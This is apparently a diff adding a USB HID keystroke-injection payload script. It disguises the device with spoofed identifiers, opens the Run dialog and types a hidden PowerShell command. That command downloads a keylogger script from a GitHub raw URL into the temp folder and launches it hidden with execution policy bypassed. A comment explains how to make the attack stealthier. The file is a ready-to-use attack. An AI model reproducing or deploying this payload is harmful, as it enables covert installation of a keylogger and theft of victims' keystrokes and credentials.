@@ -1,0 +1,13 @@
+ATTACKMODE HID VID_046D PID_C31C MAN_SANDISK PROD_SANDISK64GB SERIAL_414632986819
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -windowstyle hidden -command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/henrychndlr/ducky-scripts/main/keylogger.ps1' -OutFile $env:TEMP\keylogger.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:TEMP\keylogger.ps1' -WindowStyle Hidden}"
+ENTER
+REM Remove the lines below if you want it to be stealthy
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING LUL
